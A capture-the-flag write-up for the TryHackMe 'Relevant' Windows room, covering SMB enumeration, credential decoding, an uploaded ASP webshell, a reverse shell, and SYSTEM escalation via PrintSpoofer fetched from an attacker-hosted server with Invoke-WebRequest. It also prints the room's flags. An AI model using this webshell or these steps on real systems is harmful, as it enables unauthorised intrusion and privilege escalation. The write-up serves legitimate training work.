# Lab Report - Relevant


# Overview 
---
- **Difficulty**: Medium 
- **Platform**: Windows
- **Link**: https://tryhackme.com/room/relevant

## Challenge Description 
---
>**Penetration Testing Challenge.**

## Resolution Summary 
---
**We discovered available services with an `Nmap` scan, revealing HTTP, SMB, and RDP among others. We enumerated SMB shares anonymously, finding a `passwords.txt` file containing base64-encoded credentials for two users. We verified the credentials with `crackmapexec` and confirmed write access to the share. By uploading an ASP webshell to the SMB share and accessing it through the web application on port 49663, we achieved RCE and obtained a reverse shell via an ASPX payload. Finally, we escalated to SYSTEM by abusing the `SeImpersonate` privilege using `PrintSpoofer.exe`.**

# Information Gathering 
---
- **Since we had an IP address, we started by performing an `Nmap` scan in order to find available services, we added the `-sV` flag in order to find potential vulnerabilities related to a software's version. 
```bash 
sudo nmap -sV 10.82.184.223 -p-
```

- **We observed the following results:
```bash
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
49663/tcp open  http          Microsoft IIS httpd 10.0
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

- **To begin with, we investigated the web application on port 80.

## HTTP (80)
---
-  **Upon accessing the web page, we found the default home page for IIS Windows servers. The source page did not provide any useful information.**

- **We attempted a directory fuzzing with `Gobuster`, but it did not bear any tangible results.**

- **We also did not find any usable exploit related to the IIS version (10.0)**

## SMB (445)
---
- **Next, we shifted our focus on the SMB server.** 
- **We attempted to enumerate shares anonymously using:**
```bash
smbclient -L //10.82.184.223 -N
```

- **We found the following shares:**
```bash
Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        nt4wrksv        Disk      
```

- **We decided to further investigate the `nt4wrksv` share and tried to log in anonymously, which succeeded.** 

- **On we accessed the `nt4wrksv` share, we started by enumerating available files, and we found the `passwords.txt` file.** 
- **We retrieved the file locally first:**
```bash
get passwords.txt
```

- **Then we found 2 encoded strings in that file:**
```bash
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk 
```

- **Upon decoding (base64, using [CyberChef](https://gchq.github.io/CyberChef/)) both strings, we found 2 pairs of credentials:**
	- **`Bob - !P@$$W0rD!123`**
	- **`Bill - Juw4nnaM4n420696969!$$$`**

- **From there, we used `crackmapexec` to test our credentials:
```bash
crackmapexec smb 10.82.191.77 -u Bob -p '!P@$$W0rD!123'
#Results
SMB         10.82.191.77    445    RELEVANT         [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:RELEVANT) (domain:Relevant) (signing:False) (SMBv1:True)
SMB         10.82.191.77    445    RELEVANT         [+] Relevant\Bob:!P@$$W0rD!123
```

```bash
crackmapexec smb 10.82.191.77 -u Bill -p 'Juw4nnaM4n420696969!$$$'
SMB         10.82.191.77    445    RELEVANT         [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:RELEVANT) (domain:Relevant) (signing:False) (SMBv1:True)
SMB         10.82.191.77    445    RELEVANT         [+] Relevant\Bill:Juw4nnaM4n420696969!$$$
```

- **Based on the output, `Relevant` is the domain of both users, and we will need to use the `[domain]/[user]` format for usernames when authenticating to services.** 

- **We also tested the following command to see what permissions we had over the share:**
```bash
crackmapexec smb 10.82.191.77 -u Bill -p 'Juw4nnaM4n420696969!$$$' --shares
#Results
SMB         10.81.177.88    445    RELEVANT         nt4wrksv        READ,WRITE 
```

- **Hence, we since we had 2 web applications, we could test if they were Including files from the share we had access to. If it were the case, we would be able to achieve (if there is no significant filtering, or none at all) RCE.**

# Exploitation 
---
- **To demonstrate that, we uploaded a file text on the SMB share using:**
```bash
#Connect to the SMB share, a password will be requested
smbclient  //10.81.177.88/nt4wrksv -U "Relevant\Bill"
#Upload the file 
put test.txt
```

- **Then we navigated on both web apps and appended the following directory: `/nt4wrksv/test.txt`.**
- **Finally, we found out that the website on port `49663` did have this feature.

- **From there, we used the following `ASP` code to get a webshell: 
```asp
<%
Set o = CreateObject("WScript.Shell")
Set e = o.Exec("cmd.exe /c " & Request("cmd"))
Response.Write("<pre>" & e.StdOut.ReadAll() & "</pre>")
%>
```

- **Next, we uploaded it on the SMB share with:**
```bash
put webshell.asp
```

- **Therefore, we obtained RCE by using the following URL: `http://10.81.177.88:49663/nt4wrksv/webshell.asp?cmd=whoami`

- **From there, we directly attempted to upload a reverse shell, we used an `.aspx` reverse shell found in [this](https://github.com/borjmz/aspx-reverse-shell) GitHub repository.** 
- **Therefore, we gained a reverse shell and found the first flag:**
	- `user.txt:THM{fdk4ka34vk346ksxfr21tg789ktf45}`

# Privilege Escalation 
---
- **We started by determining which privileges our current user had by using the following:**
```cmd
whoami /priv
```

- **We found out that the `SeImpersonate` privilege was enabled (which can allow us to spawn a service, coerce SYSTEM to authenticate to it then impersonate SYSTEM), hence we relied on `PrintSpoofer.exe` in order to gain SYSTEM privileges.**

- **We downloaded the executable from [this](https://github.com/dievus/printspoofer/blob/master/PrintSpoofer.exe) repository.**
- **We uploaded it into the target by hosting a python HTTP server and using:** 
```cmd 
powershell -c "Invoke-WebRequest http://192.168.200.109:8000/PrintSpoofer.exe -OutFile C:\Windows\Temp\PrintSpoofer.exe"
```

- **Then we ran the executable with the following command, gained SYSTEM privileges and accessed the final flag:**
```cmd
C:\Windows\Temp\PrintSpoofer.exe -i -c cmd
```

# Trophy 
---
**User.txt → `THM{fdk4ka34vk346ksxfr21tg789ktf45}`  

**Root.txt → `THM{1fk5kf469devly1gl320zafgl345pv}`**

# Lessons Learned
---
- **Multiple 'Duplicate' web application services**: Always test your techniques on all the instances. While some might not work on one, they can perfectly work on the other instance. 
- **Trying multiple payloads**: While it is not directly mentioned, we tried several techniques to obtain a reverse shell, but only one succeeded, hence you should always try different approaches when aiming for something.  
